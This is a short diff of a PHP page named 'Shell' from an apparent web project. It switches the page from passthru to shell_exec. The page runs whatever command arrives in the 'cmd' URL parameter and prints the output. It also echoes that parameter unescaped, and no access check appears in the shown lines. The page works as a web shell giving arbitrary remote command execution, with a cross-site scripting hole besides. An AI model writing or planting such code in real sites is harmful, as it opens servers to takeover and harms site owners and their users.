@@ -29,13 +29,14 @@ baseSuperior("Shell");
 		<script type="text/javascript">
 		  document.getElementById('inputcillo').focus();
 		</script>
-<?
+		
+<?php
 
 $cmd = getGet("cmd");
 if ($cmd == "")
 	$cmd = "pwd";
-echo getGet("cmd")."<br /><br />";
-str_replace(str_replace(passthru("$cmd 2>&1"), "\r\n", "<br />"), "\n", "<br />");
+echo "<br />".getGet("cmd")."<br /><br />";
+print nl2br(shell_exec("$cmd 2>&1"));
 
 
 baseInferior();
